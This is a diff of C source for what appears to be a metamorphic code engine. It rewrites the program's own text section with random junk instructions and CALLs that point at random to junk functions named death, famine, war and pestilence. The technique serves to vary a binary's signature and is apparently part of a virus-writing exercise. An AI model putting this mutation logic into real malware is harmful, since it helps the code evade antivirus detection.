@@ -18,6 +18,11 @@ int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
 uint16_t __attribute__((section(".text#"))) g_ri = 0;
 
+void junk_death(void);
+void junk_famine(void);
+void junk_war(void);
+void junk_pestilence(void);
+
 void junk_death(void) {
 	char tmp = 0;
 	char a = 0;
@@ -46,15 +51,12 @@ static int find_pattern(uint8_t *self, size_t offset) {
 			self[offset + 6] == XCHG &&
 			self[offset + 7] == RAX_RAX &&
 
-			self[offset + 8] == POP_RBX &&
-			self[offset + 9] == POP_OP);
+			self[offset + 8] == OP_64 &&
+			self[offset + 9] == XCHG &&
+			self[offset + 10] == RAX_RAX &&
 
-			//self[offset + 8] == OP_64 &&
-			//self[offset + 9] == XCHG &&
-			//self[offset + 10] == RAX_RAX &&
-
-			//self[offset + 11] == POP_RBX &&
-			//self[offset + 12] == POP_OP);
+			self[offset + 11] == POP_RBX &&
+			self[offset + 12] == POP_OP);
 }
 
 static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
@@ -142,9 +144,7 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 	int jmp_index = -1;
 
 	while (nop_size > 0) {
-		bytes_len = (ft_nrand() % 2) + 2;
-		//bytes_len = 5;
-
+		bytes_len = (ft_nrand() % 4) + 2;
 
 		if (nop_size < bytes_len) {
 			bytes_len = nop_size;
@@ -182,13 +182,14 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 			case 5: 
 				{
 					nop[offset] = 0xE8;
+					void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
+					int size = sizeof(tab) / sizeof(tab[0]);
 
-					int32_t rel_offset = (int32_t)((uintptr_t)junk_death - (uintptr_t)_start);
+					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
 					rel_offset = rel_offset - (file_off + 0x7 + offset);
-					//_printf("rel_offset: %x\n", rel_offset);
 					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
-					break;
 				}
+				break;
 
 			default:
 				break;
@@ -294,11 +295,12 @@ void prepare_mutate(void) {
 
 void mutate(void) {
 
-	JUNK;
 
 	uintptr_t start = (uintptr_t)&_start;
 
 	replace_nop((uint8_t *)start, g_junk_offsets);
+
+	JUNK;
 
 }
 
